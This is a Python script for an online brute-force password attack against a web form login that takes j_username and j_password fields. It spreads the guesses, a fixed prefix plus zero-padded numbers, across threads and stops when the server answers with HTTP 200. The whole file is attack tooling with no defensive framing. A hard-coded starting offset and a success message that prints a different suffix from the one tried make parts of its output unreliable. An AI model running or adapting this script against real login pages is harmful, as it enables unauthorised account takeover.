import threading, requests,  os, re, time
from datetime import datetime

############ VARS ############
configFile = 'config/config.confnose'
DEBUG = True

######### FUNCTIONS #########
def colored(text, color):
    ColorCodes = {'black':'30','red':'31','yellow':'33','green':'32','blue':'34','cyan':'36','magenta':'35','white':'37','gray':'90','reset':'0'}
    return '\033[' + ColorCodes[str(color).lower()] + 'm' + str(text) + "\033[0m"

class cfg:
    def __init__(self):
        pass

    def read(self, configfile):
        DebugPrint('Config','Parseing Config File', 'cyan')
        data = open(configFile, 'r').read().split('\n')
        final = {}
        for i in data:
            working = i.split('=')
            try:
                working[0] = working[0].replace(' ','')
                working[1] = re.search(r'"([A-Za-z0-9_\./\\-]*)"', working[1]).group().replace('"','')
            except:
                pass
            if len(working[0]) >= 3 and working[0][0] != '#':
                final[working[0]] = working[1]
        DebugPrint('Config','Config File Parsed Successfully', 'green')
        self.configFileData = final

    def get(self, Thing):
        return self.configFileData[Thing]

def DebugPrint(Catagory, Text, Color):
    if not DEBUG: return
    print(colored('['+datetime.now().strftime("%H:%M:%S")+'] ','yellow')+colored('['+Catagory+'] ','magenta')+colored(Text,Color))

class check(threading.Thread):
    def __init__(self, thread, url, pWordIta, pWord, uName, timeout, startTime, startIndex):
        threading.Thread.__init__(self)
        self.thread = thread
        self.url = url
        self.pWordIta = pWordIta
        self.pWord = pWord
        self.uName = uName
        self.timeout = timeout
        self.startIndex = startIndex
        self.startTime = startTime

    def run(self):
        for i in range(self.startIndex, self.pWordIta):
            toTry = self.pWord + (str(i).zfill(len(str(self.pWordIta))))
            DebugPrint("Crack", f'{colored("Trying", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(toTry, "green")}', "cyan")
            try:
                ses = requests.Session()
                ses.max_redirects = 2
                data = ses.post(self.url, timeout=self.timeout, data={"j_password": toTry, "j_username": self.uName})
            except (requests.exceptions.TooManyRedirects, requests.exceptions.Timeout):
                continue
            if data.status_code != 200: continue
            DebugPrint("Complete", f'{colored("Password", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(f"{self.pWord}{str(i).zfill(2)}", "green")} {colored(f"[{int(time.time() - self.startTime)}]", "blue")}', "cyan")
            os._exit(0)

####### MAIN FUNCTION #######
def main():
    DebugPrint('Main', 'Starting...', 'green')  
    config = cfg()
    config.read(configFile)
    url = config.get('url').split('"')[1]
    pWordIta = int(config.get('pWordIta'))
    uName = config.get('uName').split('"')[1]
    pWord = config.get('pWord')
    timeout = float(config.get('timeout'))
    threads = int(config.get('threads'))
    startTime = time.time()

    DebugPrint("Info", f'{colored("Username", "cyan")} {colored(uName, "blue")}', "cyan")

    for i in range(threads):
        t = check(i, url, pWordIta, pWord, uName, timeout, startTime, 5920 + int((pWordIta/threads - 1) * i))
        t.daemon = True
        t.start()
    
if __name__ == "__main__":
    try:
        main()
        while True:
            continue
    except:
        DebugPrint('Main', 'Exiting...', 'red')